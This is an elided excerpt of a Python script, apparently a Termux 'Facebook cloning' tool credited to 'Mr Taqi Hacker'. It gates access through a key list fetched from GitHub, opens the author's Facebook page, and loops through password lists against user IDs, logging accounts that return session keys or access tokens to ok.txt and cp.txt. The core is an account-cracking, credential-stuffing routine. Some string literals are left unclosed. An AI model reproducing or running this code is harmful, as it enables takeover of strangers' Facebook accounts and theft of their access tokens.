...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : www.gitclone//github.com/TaqiHacker786-xd \x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : https://www.facebook.com/APNE.PAPA.KI.LINK.COPY.KARY.GA \x1b[0m\x1b[1;97m]
───────────────────────────────────────────────────────× 
 """)
...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/taqihacker786/T9QII-XD/blob/main/TAQI.PY"])
	#yahan apni facebook id link dalna
	exit(" [=>] FACEBOOK :  https://www.facebook.com/APNE.PAPA.KI.LINK.COPY.KARY.GA
...
def notice():
	...
	runtxt("\n\033[0;97m  Free 2009 cloning Tool For Free Aproval Send Request ")
	os.system("xdg-open https://www.facebook.com/APNE.PAPA.KI.LINK.COPY.KARY.GA)
	runtxt("\033[0;97m Key Approval ke Lai Group Request Bhejen >> %s%s"%(G,basesplit))
	runtxt("\033[0;97m Key Owner Taqi ke post pe coment krein")
	os.system("xdg-open https://www.facebook.com/APNE.PAPA.KI.LINK.COPY.KARY.GA)
	subprocess.check_output(["am", "start", "https://www.facebook.com/APNE.PAPA.KI.LINK.COPY.KARY.GA"])
...
class Main:
	def __init__(self):
		...
		try:
			...
			plr = requests.get('https://github.com/Mr-Taqi-xd/run.txt/blob/main/run.txt').text
			if basesplit in plr:
				key = basesplit
 ...
 /__   \  /_\    /___ \  \_   \
   / /\/ //_\\  //  / /   / /\/
  / /   /  _  \/ \_/ / /\/ /_    •MR TAQI HACKER
  \/    \_/ \_/\___,_\ \____/ UNBEATABLE 😛❤️
                               
                             
                              
 ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Mr Taqi Hacker\x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Version : 8\x1b[0m\x1b[1;97m] \033[1;37m 
 ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : Mr-Taqi \x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : www.gitclone//github.com/Mr-Taqi-xd \x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : https://www.facebook.com/APNE.PAPA.KI.LINK.COPY.KARY.GA \x1b[0m\x1b[1;97m]
───────────────────────────────────────────────────────× 
    """)
		...
		print("───────────────────────────────────────────────────────× ")
		print(" \t\033[1;97m[\x1b[1;97m\x1b[1;41m SEND THE REQUEST FIRST\x1b[0m\x1b[1;97m] \033[1;37m ")
		subprocess.check_output(["am", "start", "https://www.facebook.com/APNE.PAPA.KI.LINK.COPY.KARY.GA"])
		print("───────────────────────────────────────────────────────× ")
  ...
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;97m   [=TAQI=OK=>] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write("   [=TAQI=OK=>]  %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[0;92m   [=TAQI=CP=>] %s | %s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write("   [=TAQI=CP=>]  %s|%s\n"%(uid, pw))
				break
			else:
				continue
